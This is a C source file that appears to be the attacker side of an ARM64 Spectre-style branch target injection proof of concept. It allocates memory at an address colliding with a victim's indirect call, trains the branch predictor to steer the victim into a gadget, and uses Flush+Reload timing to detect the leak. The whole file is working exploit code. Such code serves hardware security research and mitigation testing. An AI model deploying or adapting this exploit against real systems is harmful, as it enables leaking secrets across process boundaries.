#define _GNU_SOURCE 1

#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include "flush_reload.h"
#include "timing.h"
#include "utils.h"

#include "libcall.h"

// gadget in libcall
void gadget(void);


#define STP 0xa9be7bfd   // stp x29, x30, [sp, #-32]  push frame pointer & link reg onto stack
#define MOV 0x910003fd   // mov x29, sp               set frame pointer to stack pointer
#define LDR 0xF9400294   // ldr x20, [x20]            load function pointer from "pointer chase"
#define NOP 0xD503201F   // nop
#define BLR 0xd63f0280   // blr x20                   branch to x20 & store current PC to link reg
#define LDP 0xa8c27bfd   // ldp x29, x30, [sp, #32]   pop frame pointer & link reg off stack
#define RET 0xd65f03c0   // ret                       return (to link reg)

// make it as long as indirect_call, and in particular
// make sure BLR is at the same virtual addr (with 1 high bit flipped)
uint32_t const training_jump[] = {NOP, NOP, STP, MOV, LDR, BLR, LDP, RET};


#define JUMP_LEN sizeof(training_jump)

char * fr_buffer = 0;
uint64_t atimes[256] = {0};



int main(int argc, char ** argv)
{
    /***********
     * Init
     ***********/
    
    //F+R buffer
    //fr_buffer = alloc_flush_reload();
    fr_buffer = libcall_data;

    uint64_t pagesize = sysconf(_SC_PAGESIZE);
    printf("pagesize=%" PRIu64 " entry_size=%" PRIu64 "\n", pagesize, FLUSH_RELOAD_ENTRY_SIZE);

    uint64_t thresh = 28;



    /****************
      Prepare pointer chase
      To access the address of the victim function f, the victim will need to dereference a pointers:
        x20 <- ptrs[0]
        ldr x20, [x20]
        blr x20
      The pointer is stored in its own cacheline that we flush before the victim code is called.

      For the in-place training part, we also need to pass &g by pointer.
    ****************/
    
    void ** g_ptr = mmap(
        NULL,
        128, // one cacheline size
        PROT_READ | PROT_WRITE,
        MAP_SHARED | MAP_ANONYMOUS,
        -1,
        0
    );
    g_ptr[0] = &gadget;



    /****************
     * CA-IP or CA-OOP
     ***************/

    /* Init for CA-OOP
       indirect_call is in the shared libary, it will be called at a later point
       by the victim. We want to poison the BTB so that indirect_call speculatively
       calls our gadget.

       In the in-place scenario: call directly indirect_call(gadget) to poison the BTB

       In the out-of-place scenaraio: setup a colliding indirect call (my_indirect_call),
       and call my_indirect_call(gadget) to poison the BTB.
    */       
    uint64_t victim_code_addr_exact = &indirect_call;
    uint64_t victim_code_addr_base = victim_code_addr_exact & ~((uint64_t)0xfff);
    // -2 * 4: leave space for STP + MOV
    uint64_t offset = (victim_code_addr_exact & 0xfff);

    int shift = 38;
    while(1)
    {
        shift = (shift < 47) ? shift + 1 : 30;
        //fprintf(stderr, "Shift %d:\n", shift);

        // flip a single high bit in the virtual address of the victim code
        // to get the virtual address where we will put our attacker code 
        uint64_t attacker_code_addr_base = ((uint64_t)1 << shift) ^ victim_code_addr_base;

        
        // Allocate memory for executable attacker code
        unsigned char* attacker_executable_base = mmap(
            (void*) attacker_code_addr_base,
            4096,
            PROT_READ | PROT_WRITE,
            MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED,
            -1,
            0
        );
        if (attacker_executable_base == MAP_FAILED) {
            perror("mmap");
            continue;
        }
        
        unsigned char* attacker_executable = attacker_executable_base + offset;

        // Write executable to attack address
        memcpy(attacker_executable, &indirect_call, 0x100);

        /* This new function is our colliding indirect call */
        int(*my_indirect_call)(int(**)(void)) = attacker_executable;

        // Set executable permission
        mprotect(attacker_executable_base, 4096, PROT_READ | PROT_EXEC);
        



        /* Train by repeatedly calling the attacker function from the attacker callsite.
           At the same time, the the victim process will call indirect_call(f), which will
           mispredict the indirect call and speculatively exectue g. g will leak the value
           of x21 in the F+R buffer.
        */
        flush_buffer(fr_buffer);
        full_fence();
        for (size_t i = 0 ; i < 10000; i++)
        {
#if 0
            // CA-IP
            asm volatile("mov x21, #5\n\t":::);
            indirect_call(g_ptr);
#else
            // CA-OOP
            asm volatile("mov x21, #5\n\t":::);
            my_indirect_call(g_ptr);
#endif
        }

        full_fence();
        reload(fr_buffer, atimes);
        
        fprintf(stderr, "low atimes:");
        for(int c = 0; c < 256; c++){
            if (atimes[c] < thresh) {
                fprintf(stderr, "%d(%" PRIu64 ") ", c, atimes[c]);
            }
        }
        fprintf(stderr, "\n");
        
        if (atimes[42] < thresh) {
            fprintf(stderr, "MISPREDICTION   access_time=%" PRIu64 "\n", atimes[42]);
            //fprintf(stderr, "%p %p\n\n", victim_executable, attacker_executable);
        }

        munmap(attacker_executable, 4096);

        full_fence();
    }
}